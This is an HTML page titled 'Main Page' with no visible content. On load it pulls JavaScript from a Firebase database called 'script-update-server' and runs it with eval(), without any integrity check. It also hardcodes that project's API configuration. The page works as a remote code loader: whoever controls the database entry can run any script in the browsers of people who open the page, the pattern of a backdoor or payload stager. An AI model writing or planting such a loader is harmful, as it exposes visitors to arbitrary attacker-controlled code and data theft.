<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Main Page</title>
</head>
<body>

<script id="js">
<!-- Latest Admin JS will load here -->
</script>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
import { getDatabase, ref, get } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";

// ===== Your Firebase Config =====
const firebaseConfig = {
  apiKey: "AIzaSyDuoka8B7oR6blqM6DawxGR7Lz1q6g6n44",
  authDomain: "script-update-server.firebaseapp.com",
  projectId: "script-update-server",
  storageBucket: "script-update-server.firebasestorage.app",
  messagingSenderId: "1065485832455",
  appId: "1:1065485832455:web:7705978342f83a9caf35a2",
  measurementId: "G-RW1VCSL93V"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

(async () => {
    try {
        const snap = await get(ref(db, 'latestJS'));
        if (snap.exists()) {
            const code = snap.val();
            document.getElementById("js").innerHTML = code;
            eval(code);
        } else {
            console.log("No JS code found in DB");
        }
    } catch (e) {
        console.error("Firebase load error:", e);
    }
})();
</script>

</body>
</html>
